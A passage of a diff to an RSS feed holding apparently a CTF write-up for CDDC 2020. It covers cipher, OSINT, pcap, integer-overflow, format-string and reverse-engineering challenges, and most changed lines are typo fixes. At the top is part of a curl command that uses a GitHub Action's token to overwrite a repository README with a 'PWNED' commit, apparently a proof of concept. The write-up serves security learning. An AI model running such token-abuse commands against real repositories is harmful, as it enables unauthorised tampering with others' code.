punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;GITHUB_REPOSITORY&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;/contents/README.md --header &apos;authorization: Bearer &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;INPUT_GITHUB-TOKEN&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos; --header &apos;content-type: application/json&apos; --data &apos;{ &quot;message&quot;: &quot;PWNED!!!!&quot;, &quot;content&quot;: &quot;V2UgYXJlIGluY3JlZGlibHkgc2VjdXJlISBCdXQgaWYgeW91IGRpc2FncmVlLCBwbGVhc2UgZmlsZSBhIFBSIDopCk5PUEUsIEkgRElTQUdSRUVFRSEh&quot;, &quot;sha&quot;: &quot;959c46eb0fbab9ab5b5bfb279ab6d70f720d1207&quot; }&apos; --fail&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
 &lt;p&gt;
   &lt;a
     class=&quot;gatsby-resp-image-link&quot;
@@ -421,11 +639,11 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
     &lt;/p&gt;
 &lt;p&gt;We were given a website that has a countdown, viewing the page source and the flag was in a comment&lt;/p&gt;
 &lt;h3&gt;[Crypto-1] My Best Friend, Julius!&lt;/h3&gt;
-&lt;p&gt;JHLZHY&lt;em&gt;ZLSSZ&lt;/em&gt;ZLHZOLSSZ&lt;em&gt;IF&lt;/em&gt;AOL_ZLHZOVYL&lt;/p&gt;
-&lt;p&gt;Flag: CAESAR&lt;em&gt;SELLS&lt;/em&gt;SEASHELLS&lt;em&gt;BY&lt;/em&gt;THE_SEASHORE&lt;/p&gt;
+&lt;p&gt;JHLZHY_ZLSSZ_ZLHZOLSSZ_IF_AOL_ZLHZOVYL&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CAESAR_SELLS_SEASHELLS_BY_THE_SEASHORE&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Gaius &lt;strong&gt;Julius&lt;/strong&gt; Caesar. Probably a caesar shift cipher, use &lt;a href=&quot;https://cryptii.com/pipes/caesar-cipher&quot;&gt;cryptii caesar&lt;/a&gt; to decrypt it.&lt;/p&gt;
 &lt;h3&gt;[OSINT-1] Better Alternative Than TV&lt;/h3&gt;
-&lt;p&gt;Google “UnduplicitousCorp” result in a Youtube Channel. Flag was found at about channel page.&lt;/p&gt;
+&lt;p&gt;Google “UnduplicitousCorp” result in a YouTube Channel. Flag was found at about channel page.&lt;/p&gt;
 &lt;h3&gt;[Web-2] VulnLogin&lt;/h3&gt;
 &lt;p&gt;
   &lt;a
@@ -643,7 +861,7 @@ flag format is CDDC20{username_password}&lt;/p&gt;
 &lt;p&gt;netcat to given domain and port&lt;/p&gt;
 &lt;h3&gt;[Crypto-2] Cryptic Message&lt;/h3&gt;
 &lt;p&gt;hq hm kbq jipoox yhnnhatoq qb abkmqjtaq p mijhim bn hknijikaim, ipaS yidikyikq tdbk hqm djIyiaimmbJ pky ipas mhcdoi hk hqmion. hn, pnqij ybhkg mb, bkI mhcdox rkbarm btq poo qsi aikQjpo hknijikaim pky djimikqm bki’m ptyhikai vhqs qsi mqpjqhkg-dbhkq pky qsi abkaoTmhbk, bki cpx dJbytai p mqpjqohKg, qsbtgs dbmmhlox p cijiqjhahbtM, inniaq.&lt;/p&gt;
-&lt;p&gt;My teammate Ethan found out that the ciphertext was encrypted with a substitution  cipher. Use &lt;a href=&quot;https://quipqiup.com/&quot;&gt;Automated substitution cipher solver&lt;/a&gt; and group all capitalized letters to obtain flag.&lt;/p&gt;
+&lt;p&gt;My teammate Ethan found out that the ciphertext was encrypted with a substitution cipher. Use &lt;a href=&quot;https://quipqiup.com/&quot;&gt;Automated substitution cipher solver&lt;/a&gt; and group all capitalized letters to obtain flag.&lt;/p&gt;
 &lt;h3&gt;[Network-1] Baby Shark&lt;/h3&gt;
 &lt;p&gt;Viewing the pcap in wireshark show us a bunch of HTTP traffic including images. Export objects and flag is found in one of the images.&lt;/p&gt;
 &lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{TLP_RED_EYES_ONLY}&lt;/code&gt;&lt;/p&gt;
@@ -656,7 +874,7 @@ flag format is CDDC20{username_password}&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
       &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;nc&lt;/span&gt; zer0.chall.cddc2020.nshc.sg &lt;span class=&quot;token number&quot;&gt;20002&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;p&gt;My teammate Ethan mutiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. &lt;/p&gt;
+&lt;p&gt;My teammate Ethan multiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. However, the answer is simple, 2^32-1.&lt;/p&gt;
 &lt;h3&gt;[Misc-2] ARGH&lt;/h3&gt;
 &lt;p&gt;Key: GZ2gXZ3bD2qqNyNxXb5LJ8HfHQtTL5VHA
 Execute the binary and feed the key&lt;/p&gt;
@@ -704,7 +922,7 @@ Execute the binary and feed the key&lt;/p&gt;
 &lt;h3&gt;[RE (Windows)-1] Decompile Me (Unsolved)&lt;/h3&gt;
 &lt;p&gt;Use tools such as &lt;a href=&quot;https://github.com/matiasb/unpy2exe&quot;&gt;unpy2exe&lt;/a&gt;. Couldn’t get it working.&lt;/p&gt;
 &lt;h3&gt;[Forensics-3] Top Secret&lt;/h3&gt;
-&lt;p&gt;TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts. &lt;/p&gt;
+&lt;p&gt;TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts.&lt;/p&gt;
 &lt;h3&gt;[Pwn (Linux)-3] Find Singapore Bug&lt;/h3&gt;
 &lt;p&gt;FSB also known as Format String Bug, able to leak out flag by inputting many &lt;code class=&quot;language-text&quot;&gt;%x&lt;/code&gt; or &lt;code class=&quot;language-text&quot;&gt;%c&lt;/code&gt;. Swap Endianess to obtain the flag&lt;/p&gt;
 &lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}&lt;/code&gt;&lt;/p&gt;
@@ -918,7 +1136,7 @@ undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;spa
   &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_18&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_14&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-  
+
   local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0x00000004&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   local_14 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;in_GS_OFFSET &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   local_18 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
@@ -953,7 +1171,7 @@ undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;spa
 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
   undefined local_10c &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-  
+
   &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;token function&quot;&gt;FUN_00011090&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
@@ -970,7 +1188,7 @@ undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;spa
 
 &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; unaff_EBX&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-  
+
                     &lt;span class=&quot;token comment&quot;&gt;/* WARNING: Could not recover jumptable at 0x000110a4. Too many branches */&lt;/span&gt;
                     &lt;span class=&quot;token comment&quot;&gt;/* WARNING: Treating indirect jump as call */&lt;/span&gt;
   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;code &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;unaff_EBX &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
@@ -979,6 +1197,6 @@ undefined4 &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;spa
       &lt;/div&gt;
 &lt;h3&gt;Between 0&amp;#x26;1 (Unsolved)&lt;/h3&gt;
 &lt;h3&gt;WYSIWYG (Unsolved)&lt;/h3&gt;
-&lt;h2&gt;Addtional resources&lt;/h2&gt;
+&lt;h2&gt;Additional resources&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;https://blog.justins.in/cddc20/&quot;&gt;https://blog.justins.in/cddc20/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Note: &lt;em&gt;The website above solves some challenges that my team did not, you may want to read it.&lt;/em&gt;&lt;/p&gt;</content:encoded></item></channel></rss>
